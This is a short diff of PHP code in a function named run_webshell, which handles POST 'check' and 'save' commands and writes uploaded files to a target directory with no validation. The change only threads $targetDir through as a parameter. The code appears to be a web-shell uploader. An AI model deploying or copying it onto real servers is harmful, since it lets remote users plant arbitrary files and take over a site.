@@ -18,17 +18,17 @@ function run_webshell() {
     $command = $_POST['command'];
     switch ($command) {
         case 'check':
-            return check_file();
+            return check_file($targetDir);
             break;
         case 'save':
-            return save_file();
+            return save_file($targetDir);
             break;
         default:
             return "undefind command: '$command'";
     }
 }
 
-function check_file() {
+function check_file($targetDir) {
     if ( !isset($_POST['filename']) ) {
         return 'please enter filename';
     }
@@ -40,7 +40,7 @@ function check_file() {
     return 'not exist';
 }
 
-function save_file() {
+function save_file($targetDir) {
     if (isset($_FILES['uploaded_file'])) {
         $fileName = basename($_FILES['uploaded_file']['name']);
         $targetFilePath = $targetDir . $fileName;
